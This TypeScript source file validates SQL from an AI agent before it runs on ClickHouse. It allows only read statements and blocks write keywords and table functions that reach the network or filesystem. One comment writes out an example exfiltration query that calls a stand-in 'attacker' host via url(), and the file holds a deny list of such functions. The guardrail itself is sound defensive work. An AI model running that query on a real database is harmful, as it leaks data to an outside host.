/**
 * The hard guardrail between the analysis agent and ClickHouse.
 *
 * The agent never holds a database handle: it asks for SQL in its structured
 * output and THIS function decides whether the application is willing to run
 * it. Server-side `readonly=1` (geocode-agent-clickhouse.server.ts) is the
 * second lock -- ClickHouse itself rejects a write even if a statement ever
 * slipped past here -- but a rejection here is the one the agent gets to see
 * and learn from, and it also closes holes `readonly=1` does not: table
 * functions that reach the network or the local filesystem.
 *
 * Pure (no imports): unit-testable without a database and safe to import from
 * anywhere.
 */

/** Statement forms the agent is allowed to send. Anything else is refused. */
const ALLOWED_LEADING_KEYWORDS = ["SELECT", "WITH", "DESCRIBE", "DESC", "SHOW", "EXPLAIN"];

/**
 * Words that must not appear anywhere in the statement, as whole words.
 *
 * `readonly=1` already blocks every write and DDL; these are listed anyway so
 * the refusal is explainable to the agent, and because a few of them (SET,
 * SYSTEM, KILL) would otherwise waste a turn on a ClickHouse error.
 */
const FORBIDDEN_KEYWORDS = [
  "INSERT",
  "UPDATE",
  "DELETE",
  "ALTER",
  "CREATE",
  "DROP",
  "ATTACH",
  "DETACH",
  "TRUNCATE",
  "RENAME",
  "OPTIMIZE",
  "GRANT",
  "REVOKE",
  "SYSTEM",
  "KILL",
  "SET",
  "USE",
  "EXCHANGE",
  "MOVE",
  "FREEZE",
  "RESTORE",
  "BACKUP",
  "OUTFILE",
  "INFILE",
];

/**
 * Table functions that read or write outside ClickHouse's own storage. None of
 * them is a write in ClickHouse's `readonly` sense, so `readonly=1` permits
 * them: `SELECT * FROM url('http://attacker/?d=' || (SELECT ...))` is a
 * read-only query that exfiltrates. They are refused by name.
 */
const FORBIDDEN_TABLE_FUNCTIONS = [
  "url",
  "urlCluster",
  "file",
  "fileCluster",
  "s3",
  "s3Cluster",
  "remote",
  "remoteSecure",
  "cluster",
  "clusterAllReplicas",
  "mysql",
  "postgresql",
  "mongodb",
  "redis",
  "jdbc",
  "odbc",
  "hdfs",
  "hdfsCluster",
  "azureBlobStorage",
  "iceberg",
  "deltaLake",
  "hudi",
  "executable",
  "input",
  "sqlite",
  "gcs",
];

export class ReadOnlyQueryError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "ReadOnlyQueryError";
  }
}

/**
 * Strips string literals and comments so keyword matching cannot be fooled by
 * `'insert'` inside a LIKE pattern (a false refusal) or by
 * `-- harmless\nINSERT ...` (a false acceptance). Literals become empty
 * quotes, keeping the statement's shape intact for the leading-keyword check.
 */
function stripLiteralsAndComments(sql: string): string {
  let out = "";
  let index = 0;
  while (index < sql.length) {
    const char = sql[index];
    const next = sql[index + 1];
    if (char === "-" && next === "-") {
      const end = sql.indexOf("\n", index);
      index = end === -1 ? sql.length : end;
      out += " ";
      continue;
    }
    if (char === "/" && next === "*") {
      const end = sql.indexOf("*/", index + 2);
      index = end === -1 ? sql.length : end + 2;
      out += " ";
      continue;
    }
    if (char === "'" || char === '"' || char === "`") {
      const quote = char;
      index += 1;
      while (index < sql.length) {
        if (sql[index] === "\\") {
          index += 2;
          continue;
        }
        if (sql[index] === quote) {
          // Doubled quote inside a literal ('' or ""): stays inside.
          if (sql[index + 1] === quote) {
            index += 2;
            continue;
          }
          index += 1;
          break;
        }
        index += 1;
      }
      out += `${quote}${quote}`;
      continue;
    }
    out += char;
    index += 1;
  }
  return out;
}

function hasWord(haystack: string, word: string): boolean {
  return new RegExp(`(^|[^A-Za-z0-9_])${word}([^A-Za-z0-9_]|$)`, "i").test(haystack);
}

function hasCall(haystack: string, name: string): boolean {
  return new RegExp(`(^|[^A-Za-z0-9_])${name}\\s*\\(`, "i").test(haystack);
}

/**
 * Returns the statement to send to ClickHouse, or throws `ReadOnlyQueryError`
 * with a message written for the agent to read and correct.
 *
 * Accepts exactly ONE statement (a single trailing semicolon is tolerated):
 * multi-statement text is refused outright rather than partially executed.
 */
export function assertReadOnlyQuery(rawSql: string): string {
  const sql = rawSql.trim().replace(/;\s*$/, "").trim();
  if (sql === "") {
    throw new ReadOnlyQueryError("Empty query.");
  }

  const bare = stripLiteralsAndComments(sql);

  if (bare.includes(";")) {
    throw new ReadOnlyQueryError(
      "Only one statement per query is allowed; remove the ';' and send one statement.",
    );
  }

  const leading = bare.trimStart().split(/[\s(]/, 1)[0]?.toUpperCase() ?? "";
  if (!ALLOWED_LEADING_KEYWORDS.includes(leading)) {
    throw new ReadOnlyQueryError(
      `Query must start with one of ${ALLOWED_LEADING_KEYWORDS.join(", ")}; got "${leading || sql.slice(0, 24)}".`,
    );
  }

  for (const keyword of FORBIDDEN_KEYWORDS) {
    if (hasWord(bare, keyword)) {
      throw new ReadOnlyQueryError(
        `The keyword ${keyword} is not allowed. This connection is read-only analysis only.`,
      );
    }
  }

  for (const fn of FORBIDDEN_TABLE_FUNCTIONS) {
    if (hasCall(bare, fn)) {
      throw new ReadOnlyQueryError(
        `The table function ${fn}() is not allowed: queries may only read tables in this ClickHouse instance.`,
      );
    }
  }

  return sql;
}

/** True when `assertReadOnlyQuery` would accept the statement. */
export function isReadOnlyQuery(sql: string): boolean {
  try {
    assertReadOnlyQuery(sql);
    return true;
  } catch {
    return false;
  }
}
